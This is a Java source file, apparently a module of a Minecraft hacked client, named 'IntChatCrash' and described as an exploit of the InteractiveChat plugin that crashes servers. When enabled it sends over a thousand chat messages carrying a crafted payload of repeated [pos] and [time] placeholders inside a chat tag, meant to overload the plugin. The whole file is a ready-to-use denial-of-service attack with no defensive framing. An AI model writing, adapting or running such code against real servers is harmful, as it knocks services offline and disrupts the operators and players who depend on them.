package wtf.l4j.impl.modules.crash;

import wtf.l4j.api.module.Category;
import wtf.l4j.api.module.Module;
import wtf.l4j.api.module.ModuleInfo;

@ModuleInfo(name = "IntChatCrash", desc = "Exploit with the InteractiveChat plugin which causes server crash", category = Category.CRASH)
public class IntChatCrash extends Module {

    @Override
    public void onEnable() {
        for(int i = 0; i <= 1000; i++) {
            playerMsg("[pos]<chat=2eb10939-d3a4-4355-a906-dd49649aacbf:[time]:>[pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time][pos][time]");
        }
        toggle();
        super.onEnable();
    }

}
